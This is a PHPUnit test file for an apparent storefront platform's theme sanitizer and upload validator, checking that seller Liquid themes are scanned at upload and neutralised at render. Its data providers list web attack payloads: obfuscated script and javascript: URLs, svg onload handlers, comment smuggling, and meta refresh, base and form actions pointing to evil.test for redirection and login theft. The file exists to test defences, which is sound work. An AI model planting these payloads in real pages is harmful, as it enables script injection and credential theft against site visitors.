<?php
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) JUWRI LTD

namespace Tests\Modules\Storefront;

use App\Console\Commands\ThemesRevalidateCommand;
use Illuminate\Support\Facades\File;
use Juwri\Modules\Storefront\Services\Rendering\LiquidEnvironmentFactory;
use Juwri\Modules\Storefront\Services\Rendering\LiquidRenderer;
use Juwri\Modules\Storefront\Services\Rendering\RenderClient;
use Juwri\Modules\Storefront\Services\Rendering\ThemeOutputSanitizer;
use Juwri\Modules\Storefront\Storefront\ThemePackageValidator;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * P6-263: non-script HTML attacks and Liquid-built markup in seller themes — blocked at upload (source scan) and
 * neutralised at render (ThemeOutputSanitizer), with trusted platform tags kept and reference themes still clean.
 */
class ThemeOutputSanitizerTest extends TestCase
{
    private function render(string $source, array $data = [], array $registers = []): string
    {
        return (new LiquidRenderer(new LiquidEnvironmentFactory, new RenderClient))->render($source, $data, 'live', $registers);
    }

    /** @return array<string, array{0:string}> */
    public static function uploadVectors(): array
    {
        return [
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.test">'],
            'base' => ['<base href="https://evil.test/">'],
            'object' => ['<object data="x.swf"></object>'],
            'embed' => ['<embed src="x.swf">'],
            'off-site form' => ['<form action="https://evil.test/login"><input name="p"></form>'],
            'protocol-relative form' => ['<form action="//evil.test/x"></form>'],
            'formaction' => ['<button formaction="https://evil.test">Go</button>'],
            'srcdoc' => ['<div srcdoc="x"></div>'],
            'data link' => ['<a href="data:text/html,<b>x</b>">x</a>'],
            'non-image data src' => ['<img src="data:text/html;base64,AAAA">'],
            'liquid built script' => ['{{ "<scr" | append: "ipt>alert(1)</script>" }}'],
            'liquid built entity' => ["{{ '&lt;base href=x>' }}"],
            'liquid unicode escape' => ["{% assign t = '\\u003cscript' %}{{ t }}"],
            'liquid js url' => ["{% assign u = 'javascript:alert(1)' %}<a href=\"{{ u }}\">x</a>"],
            'capture markup' => ['{% capture t %}<scr{% endcapture %}{{ t }}ipt>'],
            'on handler' => ['<img src=x onerror="alert(1)">'],
        ];
    }

    #[DataProvider('uploadVectors')]
    public function test_upload_scan_rejects_vector(string $source): void
    {
        $this->assertNotSame([], ThemePackageValidator::markupIssues('templates/index.liquid', $source), $source);
    }

    public function test_upload_scan_accepts_plain_markup_and_same_site_form(): void
    {
        $ok = '<form action="/cart" method="post"><input name="q"></form><a href="https://example.com">x</a>'
            .'<img src="data:image/png;base64,AAAA" alt="{{ \'Logo\' | t }}"><span>{{ item.name | escape }}</span>';
        $this->assertSame([], ThemePackageValidator::markupIssues('templates/index.liquid', $ok));
    }

    public function test_reference_themes_still_pass_the_scan(): void
    {
        foreach (glob(resource_path('liquid-themes').'/*/*', GLOB_ONLYDIR) as $dir) {
            $this->assertSame([], ThemesRevalidateCommand::scan($dir), $dir);
        }
    }

    /** @return array<string, array{0:string, 1:string}> source => forbidden needle in output */
    public static function renderVectors(): array
    {
        return [
            'appended script' => ['{{ "<scr" | append: "ipt>alert(1)</scr" | append: "ipt>" }}', '<script'],
            'split by tag' => ["<scr{{ '' }}ipt>alert(1)</scr{{ '' }}ipt>", '<script'],
            'captured' => ['{% capture a %}<scr{% endcapture %}{{ a }}ipt>alert(1)</script>', '<script'],
            'meta refresh' => ['{{ "<meta http-equiv=refresh content=0;url=https://evil.test>" }}', 'http-equiv'],
            'base' => ['{{ "<base href=https://evil.test/>" }}', '<base'],
            'iframe' => ['{{ "<iframe src=https://evil.test></iframe>" }}', '<iframe'],
            'object' => ['{{ "<object data=x></object>" }}', '<object'],
            'embed' => ['{{ "<embed src=x>" }}', '<embed'],
            'off-site form' => ['{{ "<form action=https://evil.test/steal>" }}', 'evil.test'],
            'protocol-relative form' => ['{{ "<form action=//evil.test/steal>" }}', 'evil.test'],
            'formaction' => ['{{ "<button formaction=https://evil.test>" }}', 'evil.test'],
            'js url' => ['{{ "<a href=jav&#x61;script:alert(1)>x</a>" }}', 'script:'],
            'js url tab' => ["{{ \"<a href='java\tscript:alert(1)'>x</a>\" }}", 'alert'],
            'data link' => ['{{ "<a href=data:text/html,x>x</a>" }}', 'data:'],
            'handler' => ['{{ "<svg/onload=alert(1)>" }}', 'onload'],
            'srcdoc' => ['{{ "<div srcdoc=x>" }}', 'srcdoc'],
            'svg animate href' => ['{{ "<svg><a><animate attributeName=href values=javascript:alert(1) /></a></svg>" }}', 'animate'],
            'comment smuggle' => ['{{ \'<!-- <a title="-->"><img src=x onerror=alert(1)>\' }}', 'onerror'],
            'unclosed tag' => ['{{ "<img src=x onerror=alert(1)" }}', '<img'],
        ];
    }

    #[DataProvider('renderVectors')]
    public function test_render_neutralises_liquid_built_markup(string $source, string $needle): void
    {
        $out = $this->render($source);
        $this->assertStringNotContainsStringIgnoringCase($needle, $out, $out);
    }

    public function test_render_keeps_safe_markup(): void
    {
        $out = $this->render('<a href="/menu" class="x">{{ t }}</a><form action="/cart"><input name="q" required></form>'
            .'<img src="data:image/png;base64,AA" alt="a"><br/>', ['t' => 'Tom & Jerry']);
        $this->assertStringContainsString('<a href="/menu" class="x">Tom &amp; Jerry</a>', $out);
        $this->assertStringContainsString('<form action="/cart">', $out);
        $this->assertStringContainsString('<input name="q" required>', $out);
        $this->assertStringContainsString('src="data:image/png;base64,AA"', $out);
    }

    public function test_same_host_absolute_form_action_is_kept(): void
    {
        $this->get('/'); // bind a request host (localhost)
        $html = ThemeOutputSanitizer::sanitize('<form action="http://localhost/cart"></form><form action="https://evil.test/x"></form>');
        $this->assertStringContainsString('action="http://localhost/cart"', $html);
        $this->assertStringNotContainsString('evil.test', $html);
    }

    public function test_trusted_fragments_survive_and_cannot_be_forged(): void
    {
        ThemeOutputSanitizer::begin();
        $held = ThemeOutputSanitizer::hold('<script nonce="n">window.MB=1</script>');
        $forged = "\u{E000}mbslot:00000000000000000000000000000000:0\u{E001}";
        $out = ThemeOutputSanitizer::finish('<p>'.$held.'</p>'.$forged.'<script>evil()</script>');

        $this->assertSame(1, substr_count($out, '<script nonce="n">window.MB=1</script>'));
        $this->assertStringNotContainsString('evil()', $out);
        $this->assertStringContainsString('<p><script nonce="n">', $out);
    }

    public function test_commerce_tag_script_is_kept_through_the_render(): void
    {
        $out = $this->render('{% commerce %}<p>x</p>', [], [
            'commerce_config' => ['a' => 1], 'commerce_runtime_url' => '/assets/commerce.js', 'csp_nonce' => 'abc',
        ]);
        $this->assertStringContainsString('<script nonce="abc" src="/assets/commerce.js" defer></script>', $out);
    }

    public function test_revalidate_flags_installed_unsafe_theme(): void
    {
        $dir = storage_path('app/marketplace-themes/p6263-old/1.0.0');
        File::ensureDirectoryExists($dir.'/templates');
        File::put($dir.'/templates/index.liquid', '<meta http-equiv="refresh" content="0;url=https://evil.test">');

        try {
            $this->artisan('themes:revalidate')
                ->expectsOutputToContain('FLAGGED p6263-old@1.0.0')
                ->assertExitCode(1);
        } finally {
            File::deleteDirectory(storage_path('app/marketplace-themes/p6263-old'));
        }
    }
}
